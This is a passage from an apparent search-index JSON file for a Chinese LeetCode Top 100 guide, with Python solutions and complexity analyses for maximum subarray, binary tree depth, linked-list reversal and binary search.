<p>\u7a7a\u95f4\u4f18\u5316\u7684\u52a8\u6001\u89c4\u5212\u89e3\u6cd5\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n)</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(1)\uff0c\u53ea\u4f7f\u7528\u5e38\u6570\u7ea7\u522b\u7684\u989d\u5916\u7a7a\u95f4</li> </ul> <p>\u52a8\u6001\u89c4\u5212\u89e3\u6cd5\u901a\u8fc7\u5b58\u50a8\u5b50\u95ee\u9898\u7684\u89e3\uff0c\u907f\u514d\u4e86\u91cd\u590d\u8ba1\u7b97\uff0c\u5927\u5927\u63d0\u9ad8\u4e86\u6548\u7387\u3002\u7a7a\u95f4\u4f18\u5316\u7684\u7248\u672c\u8fdb\u4e00\u6b65\u51cf\u5c11\u4e86\u7a7a\u95f4\u4f7f\u7528\uff0c\u662f\u89e3\u51b3\u6b64\u7c7b\u95ee\u9898\u7684\u6700\u4f73\u65b9\u6848\u3002</p>"},{"location":"leetcode-top100/dynamic-programming/maximum-subarray/","title":"\u6700\u5927\u5b50\u6570\u7ec4\u548c","text":""},{"location":"leetcode-top100/dynamic-programming/maximum-subarray/#_2","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u7ed9\u5b9a\u4e00\u4e2a\u6574\u6570\u6570\u7ec4 nums \uff0c\u627e\u5230\u4e00\u4e2a\u5177\u6709\u6700\u5927\u548c\u7684\u8fde\u7eed\u5b50\u6570\u7ec4\uff08\u5b50\u6570\u7ec4\u6700\u5c11\u5305\u542b\u4e00\u4e2a\u5143\u7d20\uff09\uff0c\u8fd4\u56de\u5176\u6700\u5927\u548c\u3002</p>"},{"location":"leetcode-top100/dynamic-programming/maximum-subarray/#_3","title":"\u89e3\u9898\u601d\u8def","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u89e3\u51b3\uff1a 1. \u66b4\u529b\u89e3\u6cd5\uff1a\u8ba1\u7b97\u6240\u6709\u53ef\u80fd\u7684\u5b50\u6570\u7ec4\u548c 2. \u52a8\u6001\u89c4\u5212/Kadane\u7b97\u6cd5\uff1a\u4f7f\u7528\u52a8\u6001\u89c4\u5212\u4f18\u5316\u89e3\u6cd5</p>"},{"location":"leetcode-top100/dynamic-programming/maximum-subarray/#_4","title":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff08\u66b4\u529b\u89e3\u6cd5\uff09","text":"<p>\u8ba1\u7b97\u6240\u6709\u53ef\u80fd\u7684\u5b50\u6570\u7ec4\u548c\uff0c\u627e\u51fa\u6700\u5927\u503c\u3002</p> <pre><code>def max_subarray_brute(nums):\n    if not nums:\n        return 0\n\n    max_sum = float('-inf')\n    # \u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u8d77\u59cb\u4f4d\u7f6e\n    for i in range(len(nums)):\n        current_sum = 0\n        # \u904d\u5386\u6240\u6709\u53ef\u80fd\u7684\u7ed3\u675f\u4f4d\u7f6e\n        for j in range(i, len(nums)):\n            # \u8ba1\u7b97\u5f53\u524d\u5b50\u6570\u7ec4\u7684\u548c\n            current_sum += nums[j]\n            # \u66f4\u65b0\u6700\u5927\u548c\n            max_sum = max(max_sum, current_sum)\n\n    return max_sum\n</code></pre>"},{"location":"leetcode-top100/dynamic-programming/maximum-subarray/#kadane","title":"\u6700\u4f18\u65b9\u6848\uff08Kadane\u7b97\u6cd5\uff09","text":"<p>\u4f7f\u7528\u52a8\u6001\u89c4\u5212\u7684\u601d\u60f3\uff0c\u7ef4\u62a4\u5f53\u524d\u5b50\u6570\u7ec4\u548c\u548c\u6700\u5927\u5b50\u6570\u7ec4\u548c\u3002</p> <pre><code>def max_subarray_optimal(nums):\n    if not nums:\n        return 0\n\n    # \u521d\u59cb\u5316\u5f53\u524d\u5b50\u6570\u7ec4\u548c\u548c\u6700\u5927\u5b50\u6570\u7ec4\u548c\n    current_sum = nums[0]\n    max_sum = nums[0]\n\n    # \u4ece\u7b2c\u4e8c\u4e2a\u5143\u7d20\u5f00\u59cb\u904d\u5386\n    for i in range(1, len(nums)):\n        # \u72b6\u6001\u8f6c\u79fb\uff1a\u8981\u4e48\u5c06\u5f53\u524d\u5143\u7d20\u52a0\u5165\u524d\u9762\u7684\u5b50\u6570\u7ec4\uff0c\u8981\u4e48\u4ee5\u5f53\u524d\u5143\u7d20\u5f00\u59cb\u65b0\u7684\u5b50\u6570\u7ec4\n        current_sum = max(nums[i], current_sum + nums[i])\n        # \u66f4\u65b0\u6700\u5927\u5b50\u6570\u7ec4\u548c\n        max_sum = max(max_sum, current_sum)\n\n    return max_sum\n</code></pre>"},{"location":"leetcode-top100/dynamic-programming/maximum-subarray/#_5","title":"\u5206\u6cbb\u6cd5\uff08\u53ef\u9009\uff09","text":"<p>\u8fd8\u53ef\u4ee5\u4f7f\u7528\u5206\u6cbb\u6cd5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u867d\u7136\u65f6\u95f4\u590d\u6742\u5ea6\u4e5f\u662f O(n log n)\uff0c\u4f46\u63d0\u4f9b\u4e86\u53e6\u4e00\u79cd\u601d\u8def\uff1a</p> <pre><code>def max_subarray_divide_conquer(nums):\n    def max_crossing_sum(nums, left, mid, right):\n        # \u8ba1\u7b97\u5de6\u534a\u90e8\u5206\u7684\u6700\u5927\u548c\uff08\u4ece\u4e2d\u95f4\u5411\u5de6\u6269\u5c55\uff09\n        left_sum = float('-inf')\n        current_sum = 0\n        for i in range(mid, left - 1, -1):\n            current_sum += nums[i]\n            left_sum = max(left_sum, current_sum)\n\n        # \u8ba1\u7b97\u53f3\u534a\u90e8\u5206\u7684\u6700\u5927\u548c\uff08\u4ece\u4e2d\u95f4\u5411\u53f3\u6269\u5c55\uff09\n        right_sum = float('-inf')\n        current_sum = 0\n        for i in range(mid + 1, right + 1):\n            current_sum += nums[i]\n            right_sum = max(right_sum, current_sum)\n\n        # \u8fd4\u56de\u8de8\u8d8a\u4e2d\u70b9\u7684\u6700\u5927\u548c\n        return left_sum + right_sum\n\n    def max_subarray_helper(nums, left, right):\n        # \u57fa\u672c\u60c5\u51b5\uff1a\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\n        if left == right:\n            return nums[left]\n\n        # \u8ba1\u7b97\u4e2d\u95f4\u70b9\n        mid = (left + right) // 2\n\n        # \u9012\u5f52\u8ba1\u7b97\u5de6\u534a\u90e8\u5206\u3001\u53f3\u534a\u90e8\u5206\u548c\u8de8\u8d8a\u4e2d\u70b9\u7684\u6700\u5927\u548c\n        left_sum = max_subarray_helper(nums, left, mid)\n        right_sum = max_subarray_helper(nums, mid + 1, right)\n        cross_sum = max_crossing_sum(nums, left, mid, right)\n\n        # \u8fd4\u56de\u4e09\u8005\u4e2d\u7684\u6700\u5927\u503c\n        return max(left_sum, right_sum, cross_sum)\n\n    return max_subarray_helper(nums, 0, len(nums) - 1)\n</code></pre>"},{"location":"leetcode-top100/dynamic-programming/maximum-subarray/#_6","title":"\u590d\u6742\u5ea6\u5206\u6790","text":"<ul> <li>\u66b4\u529b\u89e3\u6cd5\uff1a</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n\u00b2)\uff0c\u5176\u4e2d n \u662f\u6570\u7ec4\u957f\u5ea6</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(1)</p> </li> <li> <p>Kadane\u7b97\u6cd5\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u53ea\u9700\u8981\u4e00\u6b21\u904d\u5386</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(1)</p> </li> <li> <p>\u5206\u6cbb\u6cd5\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n log n)</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(log n)\uff0c\u9012\u5f52\u8c03\u7528\u6808\u7684\u6df1\u5ea6</li> </ul> <p>Kadane\u7b97\u6cd5\u662f\u89e3\u51b3\u6b64\u7c7b\u95ee\u9898\u7684\u6700\u4f18\u65b9\u6848\uff0c\u5b83\u901a\u8fc7\u4e00\u6b21\u904d\u5386\u5c31\u80fd\u627e\u5230\u6700\u5927\u5b50\u6570\u7ec4\u548c\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a O(n)\uff0c\u6548\u7387\u6700\u9ad8\u3002</p>"},{"location":"leetcode-top100/dynamic-programming/overview/","title":"\u52a8\u6001\u89c4\u5212","text":"<p>\u672c\u90e8\u5206\u5305\u542b\u529b\u6263Top100\u4e2d\u4e0e\u52a8\u6001\u89c4\u5212\u76f8\u5173\u7684\u7b97\u6cd5\u9898\u76ee\u3002\u52a8\u6001\u89c4\u5212\u662f\u4e00\u79cd\u901a\u8fc7\u5c06\u539f\u95ee\u9898\u5206\u89e3\u4e3a\u76f8\u5bf9\u7b80\u5355\u7684\u5b50\u95ee\u9898\uff0c\u5e76\u5b58\u50a8\u5b50\u95ee\u9898\u89e3\u6765\u907f\u514d\u91cd\u590d\u8ba1\u7b97\u7684\u7b97\u6cd5\u8bbe\u8ba1\u65b9\u6cd5\u3002</p>"},{"location":"leetcode-top100/dynamic-programming/overview/#_2","title":"\u9898\u76ee\u5217\u8868","text":"<ul> <li>\u722c\u697c\u68af</li> <li>\u6700\u5927\u5b50\u6570\u7ec4\u548c</li> </ul> <p>\u52a8\u6001\u89c4\u5212\u95ee\u9898\u901a\u5e38\u5177\u6709\u4ee5\u4e0b\u7279\u70b9\uff1a 1. \u6700\u4f18\u5b50\u7ed3\u6784\uff1a\u95ee\u9898\u7684\u6700\u4f18\u89e3\u5305\u542b\u5176\u5b50\u95ee\u9898\u7684\u6700\u4f18\u89e3 2. \u91cd\u53e0\u5b50\u95ee\u9898\uff1a\u5728\u6c42\u89e3\u8fc7\u7a0b\u4e2d\u4f1a\u591a\u6b21\u8ba1\u7b97\u76f8\u540c\u7684\u5b50\u95ee\u9898</p> <p>\u901a\u8fc7\u5b66\u4e60\u8fd9\u4e9b\u9898\u76ee\uff0c\u53ef\u4ee5\u638c\u63e1\u52a8\u6001\u89c4\u5212\u7684\u57fa\u672c\u601d\u60f3\u548c\u89e3\u9898\u6280\u5de7\u3002</p>"},{"location":"leetcode-top100/linked-lists-trees/maximum-depth-of-binary-tree/","title":"\u4e8c\u53c9\u6811\u7684\u6700\u5927\u6df1\u5ea6","text":""},{"location":"leetcode-top100/linked-lists-trees/maximum-depth-of-binary-tree/#_2","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u7ed9\u5b9a\u4e00\u4e2a\u4e8c\u53c9\u6811\uff0c\u627e\u51fa\u5176\u6700\u5927\u6df1\u5ea6\u3002</p> <p>\u4e8c\u53c9\u6811\u7684\u6df1\u5ea6\u4e3a\u6839\u8282\u70b9\u5230\u6700\u8fdc\u53f6\u5b50\u8282\u70b9\u7684\u6700\u957f\u8def\u5f84\u4e0a\u7684\u8282\u70b9\u6570\u3002</p> <p>\u8bf4\u660e: \u53f6\u5b50\u8282\u70b9\u662f\u6307\u6ca1\u6709\u5b50\u8282\u70b9\u7684\u8282\u70b9\u3002</p>"},{"location":"leetcode-top100/linked-lists-trees/maximum-depth-of-binary-tree/#_3","title":"\u89e3\u9898\u601d\u8def","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u89e3\u51b3\uff1a 1. \u9012\u5f52\u89e3\u6cd5\uff1a\u4f7f\u7528DFS\uff08\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff09\u8ba1\u7b97\u6df1\u5ea6 2. \u8fed\u4ee3\u89e3\u6cd5\uff1a\u4f7f\u7528BFS\uff08\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff09\u6216\u5c42\u5e8f\u904d\u5386\u8ba1\u7b97\u6df1\u5ea6</p>"},{"location":"leetcode-top100/linked-lists-trees/maximum-depth-of-binary-tree/#dfs","title":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff08\u9012\u5f52DFS\uff09","text":"<p>\u4f7f\u7528\u9012\u5f52\u8ba1\u7b97\u5de6\u5b50\u6811\u548c\u53f3\u5b50\u6811\u7684\u6700\u5927\u6df1\u5ea6\uff0c\u53d6\u8f83\u5927\u503c\u52a01\u3002</p> <pre><code># \u5b9a\u4e49\u4e8c\u53c9\u6811\u8282\u70b9\u7c7b\nclass TreeNode:\n    def __init__(self, val=0, left=None, right=None):\n        self.val = val\n        self.left = left\n        self.right = right\n\ndef max_depth_brute(root):\n    # \u57fa\u672c\u60c5\u51b5\uff1a\u7a7a\u8282\u70b9\n    if not root:\n        return 0\n\n    # \u9012\u5f52\u8ba1\u7b97\u5de6\u5b50\u6811\u7684\u6700\u5927\u6df1\u5ea6\n    left_depth = max_depth_brute(root.left)\n    # \u9012\u5f52\u8ba1\u7b97\u53f3\u5b50\u6811\u7684\u6700\u5927\u6df1\u5ea6\n    right_depth = max_depth_brute(root.right)\n\n    # \u8fd4\u56de\u8f83\u5927\u7684\u6df1\u5ea6\u52a01\uff08\u52a01\u662f\u56e0\u4e3a\u8981\u5305\u542b\u5f53\u524d\u8282\u70b9\uff09\n    return max(left_depth, right_depth) + 1\n</code></pre>"},{"location":"leetcode-top100/linked-lists-trees/maximum-depth-of-binary-tree/#bfs","title":"\u6700\u4f18\u65b9\u6848\uff08\u8fed\u4ee3BFS/\u5c42\u5e8f\u904d\u5386\uff09","text":"<p>\u4f7f\u7528\u961f\u5217\u8fdb\u884c\u5c42\u5e8f\u904d\u5386\uff0c\u8bb0\u5f55\u5c42\u6570\u3002</p> <pre><code>from collections import deque\n\ndef max_depth_optimal(root):\n    # \u7279\u6b8a\u60c5\u51b5\u5904\u7406\n    if not root:\n        return 0\n\n    # \u4f7f\u7528\u961f\u5217\u8fdb\u884c\u5c42\u5e8f\u904d\u5386\n    queue = deque([root])\n    depth = 0\n\n    # \u5f53\u961f\u5217\u4e0d\u4e3a\u7a7a\u65f6\uff0c\u7ee7\u7eed\u904d\u5386\n    while queue:\n        # \u83b7\u53d6\u5f53\u524d\u5c42\u7684\u8282\u70b9\u6570\u91cf\n        level_size = len(queue)\n        # \u5c42\u6570\u52a01\n        depth += 1\n\n        # \u5904\u7406\u5f53\u524d\u5c42\u7684\u6240\u6709\u8282\u70b9\n        for _ in range(level_size):\n            node = queue.popleft()\n            # \u5c06\u5b50\u8282\u70b9\u52a0\u5165\u961f\u5217\n            if node.left:\n                queue.append(node.left)\n            if node.right:\n                queue.append(node.right)\n\n    return depth\n</code></pre>"},{"location":"leetcode-top100/linked-lists-trees/maximum-depth-of-binary-tree/#dfs_1","title":"\u8fed\u4ee3DFS\u89e3\u6cd5\uff08\u53ef\u9009\uff09","text":"<p>\u4f7f\u7528\u6808\u6a21\u62df\u9012\u5f52\u8fc7\u7a0b\uff1a</p> <pre><code>def max_depth_dfs_iterative(root):\n    if not root:\n        return 0\n\n    stack = [(root, 1)]  # \u6808\u4e2d\u7684\u5143\u7d20\u662f(\u8282\u70b9, \u6df1\u5ea6)\n    max_depth = 0\n\n    while stack:\n        node, current_depth = stack.pop()\n        max_depth = max(max_depth, current_depth)\n\n        # \u5148\u5c06\u53f3\u5b50\u8282\u70b9\u5165\u6808\uff0c\u518d\u5c06\u5de6\u5b50\u8282\u70b9\u5165\u6808\uff0c\u8fd9\u6837\u51fa\u6808\u987a\u5e8f\u662f\u5148\u5de6\u540e\u53f3\n        if node.right:\n            stack.append((node.right, current_depth + 1))\n        if node.left:\n            stack.append((node.left, current_depth + 1))\n\n    return max_depth\n</code></pre>"},{"location":"leetcode-top100/linked-lists-trees/maximum-depth-of-binary-tree/#_4","title":"\u590d\u6742\u5ea6\u5206\u6790","text":"<ul> <li>\u9012\u5f52DFS\u89e3\u6cd5\uff1a</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u5176\u4e2d n \u662f\u4e8c\u53c9\u6811\u4e2d\u7684\u8282\u70b9\u6570\uff0c\u6bcf\u4e2a\u8282\u70b9\u90fd\u4f1a\u88ab\u8bbf\u95ee\u4e00\u6b21</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(h)\uff0c\u5176\u4e2d h \u662f\u6811\u7684\u9ad8\u5ea6\uff0c\u6700\u574f\u60c5\u51b5\u4e0b\uff08\u6811\u5b8c\u5168\u4e0d\u5e73\u8861\uff09\u4e3a O(n)\uff0c\u6700\u597d\u60c5\u51b5\u4e0b\uff08\u6811\u5b8c\u5168\u5e73\u8861\uff09\u4e3a O(log n)</p> </li> <li> <p>\u8fed\u4ee3BFS\u89e3\u6cd5\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u6bcf\u4e2a\u8282\u70b9\u90fd\u4f1a\u88ab\u8bbf\u95ee\u4e00\u6b21</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(w)\uff0c\u5176\u4e2d w \u662f\u6811\u7684\u6700\u5927\u5bbd\u5ea6\uff0c\u6700\u574f\u60c5\u51b5\u4e0b\u4e3a O(n/2) = O(n)</li> </ul> <p>\u9012\u5f52DFS\u89e3\u6cd5\u867d\u7136\u5b9e\u73b0\u7b80\u5355\uff0c\u4f46\u5728\u6811\u5f88\u6df1\u7684\u60c5\u51b5\u4e0b\u53ef\u80fd\u4f1a\u6709\u6808\u6ea2\u51fa\u7684\u98ce\u9669\u3002\u8fed\u4ee3\u89e3\u6cd5\u53ef\u4ee5\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\uff0c\u4e24\u79cd\u65b9\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u76f8\u540c\uff0c\u4f46\u5728\u7a7a\u95f4\u4f7f\u7528\u4e0a\u5404\u6709\u7279\u70b9\u3002</p>"},{"location":"leetcode-top100/linked-lists-trees/overview/","title":"\u94fe\u8868\u548c\u6811","text":"<p>\u672c\u90e8\u5206\u5305\u542b\u529b\u6263Top100\u4e2d\u4e0e\u94fe\u8868\u548c\u6811\u76f8\u5173\u7684\u7b97\u6cd5\u9898\u76ee\u3002\u94fe\u8868\u548c\u6811\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u4e2d\u91cd\u8981\u7684\u975e\u7ebf\u6027\u6570\u636e\u7ed3\u6784\uff0c\u5728\u7b97\u6cd5\u8bbe\u8ba1\u4e2d\u7ecf\u5e38\u7528\u5230\u3002</p>"},{"location":"leetcode-top100/linked-lists-trees/overview/#_2","title":"\u9898\u76ee\u5217\u8868","text":""},{"location":"leetcode-top100/linked-lists-trees/overview/#_3","title":"\u94fe\u8868","text":"<ul> <li>\u53cd\u8f6c\u94fe\u8868</li> </ul>"},{"location":"leetcode-top100/linked-lists-trees/overview/#_4","title":"\u6811","text":"<ul> <li>\u4e8c\u53c9\u6811\u7684\u6700\u5927\u6df1\u5ea6</li> </ul> <p>\u94fe\u8868\u9898\u4e3b\u8981\u8003\u5bdf\u94fe\u8868\u7684\u904d\u5386\u3001\u4fee\u6539\u548c\u64cd\u4f5c\u6280\u5de7\uff0c\u6811\u9898\u5219\u4e3b\u8981\u8003\u5bdf\u6811\u7684\u904d\u5386\u3001\u9012\u5f52\u548c\u5206\u6cbb\u601d\u60f3\u3002\u901a\u8fc7\u5b66\u4e60\u8fd9\u4e9b\u9898\u76ee\uff0c\u53ef\u4ee5\u638c\u63e1\u5904\u7406\u94fe\u8868\u548c\u6811\u7ed3\u6784\u7684\u57fa\u672c\u65b9\u6cd5\u3002</p>"},{"location":"leetcode-top100/linked-lists-trees/reverse-linked-list/","title":"\u53cd\u8f6c\u94fe\u8868","text":""},{"location":"leetcode-top100/linked-lists-trees/reverse-linked-list/#_2","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u53cd\u8f6c\u4e00\u4e2a\u5355\u94fe\u8868\u3002</p> <p>\u793a\u4f8b\uff1a</p> <p>\u8f93\u5165: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL \u8f93\u51fa: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</p>"},{"location":"leetcode-top100/linked-lists-trees/reverse-linked-list/#_3","title":"\u89e3\u9898\u601d\u8def","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u89e3\u51b3\uff1a 1. \u66b4\u529b\u89e3\u6cd5\uff1a\u4f7f\u7528\u989d\u5916\u7684\u6570\u7ec4\u5b58\u50a8\u94fe\u8868\u8282\u70b9\u503c\uff0c\u7136\u540e\u91cd\u65b0\u6784\u5efa\u94fe\u8868 2. \u8fed\u4ee3\u89e3\u6cd5\uff1a\u539f\u5730\u53cd\u8f6c\u94fe\u8868\u6307\u9488</p>"},{"location":"leetcode-top100/linked-lists-trees/reverse-linked-list/#_4","title":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff08\u4f7f\u7528\u989d\u5916\u7a7a\u95f4\uff09","text":"<p>\u5148\u5c06\u94fe\u8868\u4e2d\u7684\u6240\u6709\u503c\u5b58\u5165\u6570\u7ec4\uff0c\u7136\u540e\u91cd\u65b0\u6784\u5efa\u94fe\u8868\u3002</p> <pre><code># \u5b9a\u4e49\u94fe\u8868\u8282\u70b9\u7c7b\nclass ListNode:\n    def __init__(self, val=0, next=None):\n        self.val = val\n        self.next = next\n\ndef reverse_list_brute(head):\n    # \u7279\u6b8a\u60c5\u51b5\u5904\u7406\n    if not head or not head.next:\n        return head\n\n    # \u5c06\u94fe\u8868\u4e2d\u7684\u6240\u6709\u503c\u5b58\u5165\u6570\u7ec4\n    values = []\n    current = head\n    while current:\n        values.append(current.val)\n        current = current.next\n\n    # \u91cd\u65b0\u6784\u5efa\u94fe\u8868\n    new_head = ListNode(values[-1])\n    current = new_head\n    # \u4ece\u540e\u5f80\u524d\u904d\u5386\u6570\u7ec4\uff0c\u6784\u5efa\u53cd\u8f6c\u540e\u7684\u94fe\u8868\n    for i in range(len(values) - 2, -1, -1):\n        current.next = ListNode(values[i])\n        current = current.next\n\n    return new_head\n</code></pre>"},{"location":"leetcode-top100/linked-lists-trees/reverse-linked-list/#_5","title":"\u6700\u4f18\u65b9\u6848\uff08\u8fed\u4ee3\u89e3\u6cd5\uff09","text":"<p>\u4f7f\u7528\u4e09\u4e2a\u6307\u9488\u5728\u539f\u5730\u53cd\u8f6c\u94fe\u8868\uff0c\u4e0d\u9700\u8981\u989d\u5916\u7684\u7a7a\u95f4\u3002</p> <pre><code>def reverse_list_optimal(head):\n    # \u7279\u6b8a\u60c5\u51b5\u5904\u7406\n    if not head or not head.next:\n        return head\n\n    prev = None\n    current = head\n\n    # \u8fed\u4ee3\u53cd\u8f6c\u94fe\u8868\u6307\u9488\n    while current:\n        # \u4fdd\u5b58\u4e0b\u4e00\u4e2a\u8282\u70b9\n        next_temp = current.next\n        # \u53cd\u8f6c\u5f53\u524d\u8282\u70b9\u7684\u6307\u9488\n        current.next = prev\n        # \u79fb\u52a8prev\u6307\u9488\n        prev = current\n        # \u79fb\u52a8current\u6307\u9488\n        current = next_temp\n\n    # prev\u73b0\u5728\u6307\u5411\u65b0\u7684\u5934\u8282\u70b9\n    return prev\n</code></pre>"},{"location":"leetcode-top100/linked-lists-trees/reverse-linked-list/#_6","title":"\u9012\u5f52\u89e3\u6cd5\uff08\u53ef\u9009\uff09","text":"<p>\u9664\u4e86\u4e0a\u8ff0\u4e24\u79cd\u65b9\u6cd5\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u9012\u5f52\u89e3\u6cd5\uff1a</p> <pre><code>def reverse_list_recursive(head):\n    # \u57fa\u672c\u60c5\u51b5\uff1a\u7a7a\u94fe\u8868\u6216\u53ea\u6709\u4e00\u4e2a\u8282\u70b9\n    if not head or not head.next:\n        return head\n\n    # \u9012\u5f52\u53cd\u8f6c\u5269\u4f59\u90e8\u5206\n    new_head = reverse_list_recursive(head.next)\n    # \u53cd\u8f6c\u5f53\u524d\u8282\u70b9\u548c\u4e0b\u4e00\u8282\u70b9\u7684\u5173\u7cfb\n    head.next.next = head\n    # \u65ad\u5f00\u539f\u94fe\u63a5\uff0c\u907f\u514d\u5faa\u73af\n    head.next = None\n\n    return new_head\n</code></pre>"},{"location":"leetcode-top100/linked-lists-trees/reverse-linked-list/#_7","title":"\u590d\u6742\u5ea6\u5206\u6790","text":"<ul> <li>\u66b4\u529b\u89e3\u6cd5\uff1a</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u9700\u8981\u4e24\u6b21\u904d\u5386\u94fe\u8868</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u9700\u8981\u989d\u5916\u7684\u6570\u7ec4\u5b58\u50a8\u8282\u70b9\u503c</p> </li> <li> <p>\u8fed\u4ee3\u89e3\u6cd5\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u53ea\u9700\u8981\u4e00\u6b21\u904d\u5386</li> <li> <p>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(1)\uff0c\u53ea\u4f7f\u7528\u5e38\u6570\u7ea7\u522b\u7684\u989d\u5916\u7a7a\u95f4</p> </li> <li> <p>\u9012\u5f52\u89e3\u6cd5\uff1a</p> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n)</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(n)\uff0c\u9012\u5f52\u8c03\u7528\u6808\u7684\u6df1\u5ea6</li> </ul> <p>\u8fed\u4ee3\u89e3\u6cd5\u662f\u6700\u4f18\u7684\uff0c\u56e0\u4e3a\u5b83\u5728\u65f6\u95f4\u548c\u7a7a\u95f4\u590d\u6742\u5ea6\u4e0a\u90fd\u6709\u4f18\u52bf\uff0c\u4e0d\u9700\u8981\u989d\u5916\u7684\u7a7a\u95f4\u6765\u5b58\u50a8\u8282\u70b9\u503c\u3002</p>"},{"location":"leetcode-top100/others/binary-search/","title":"\u4e8c\u5206\u67e5\u627e","text":""},{"location":"leetcode-top100/others/binary-search/#_2","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u7ed9\u5b9a\u4e00\u4e2a n \u4e2a\u5143\u7d20\u6709\u5e8f\u7684\uff08\u5347\u5e8f\uff09\u6574\u578b\u6570\u7ec4 nums \u548c\u4e00\u4e2a\u76ee\u6807\u503c target \uff0c\u5199\u4e00\u4e2a\u51fd\u6570\u641c\u7d22 nums \u4e2d\u7684 target\uff0c\u5982\u679c\u76ee\u6807\u503c\u5b58\u5728\u8fd4\u56de\u4e0b\u6807\uff0c\u5426\u5219\u8fd4\u56de -1\u3002</p>"},{"location":"leetcode-top100/others/binary-search/#_3","title":"\u89e3\u9898\u601d\u8def","text":"<p>\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u89e3\u51b3\uff1a 1. \u66b4\u529b\u89e3\u6cd5\uff1a\u987a\u5e8f\u67e5\u627e 2. \u4e8c\u5206\u67e5\u627e\uff1a\u5229\u7528\u6570\u7ec4\u6709\u5e8f\u7684\u7279\u6027\uff0c\u6bcf\u6b21\u5c06\u641c\u7d22\u8303\u56f4\u51cf\u534a</p>"},{"location":"leetcode-top100/others/binary-search/#_4","title":"\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff08\u987a\u5e8f\u67e5\u627e\uff09","text":"<p>\u4ece\u5934\u5230\u5c3e\u904d\u5386\u6570\u7ec4\uff0c\u67e5\u627e\u76ee\u6807\u503c\u3002</p> <pre><code>def search_brute(nums, target):\n    # \u904d\u5386\u6574\u4e2a\u6570\u7ec4\n    for i in range(len(nums)):\n        # \u5982\u679c\u627e\u5230\u76ee\u6807\u503c\uff0c\u8fd4\u56de\u7d22\u5f15\n        if nums[i] == target:\n            return i\n    # \u5982\u679c\u6ca1\u6709\u627e\u5230\uff0c\u8fd4\u56de-1\n    return -1\n</code></pre>"},{"location":"leetcode-top100/others/binary-search/#_5","title":"\u6700\u4f18\u65b9\u6848\uff08\u4e8c\u5206\u67e5\u627e\uff09","text":"<p>\u5229\u7528\u6570\u7ec4\u6709\u5e8f\u7684\u7279\u6027\uff0c\u6bcf\u6b21\u5c06\u641c\u7d22\u8303\u56f4\u51cf\u534a\u3002</p> <pre><code>def search_optimal(nums, target):\n    # \u521d\u59cb\u5316\u5de6\u8fb9\u754c\u548c\u53f3\u8fb9\u754c\n    left = 0\n    right = len(nums) - 1\n\n    # \u5f53\u5de6\u8fb9\u754c\u5c0f\u4e8e\u7b49\u4e8e\u53f3\u8fb9\u754c\u65f6\uff0c\u7ee7\u7eed\u641c\u7d22\n    while left &lt;= right:\n        # \u8ba1\u7b97\u4e2d\u95f4\u4f4d\u7f6e\uff08\u907f\u514d\u6574\u6570\u6ea2\u51fa\u7684\u5199\u6cd5\uff09\n        mid = left + (right - left) // 2\n\n        # \u5982\u679c\u4e2d\u95f4\u5143\u7d20\u7b49\u4e8e\u76ee\u6807\u503c\uff0c\u8fd4\u56de\u7d22\u5f15\n        if nums[mid] == target:\n            return mid\n        # \u5982\u679c\u4e2d\u95f4\u5143\u7d20\u5c0f\u4e8e\u76ee\u6807\u503c\uff0c\u641c\u7d22\u53f3\u534a\u90e8\u5206\n        elif nums[mid] &lt; target:\n            left = mid + 1\n        # 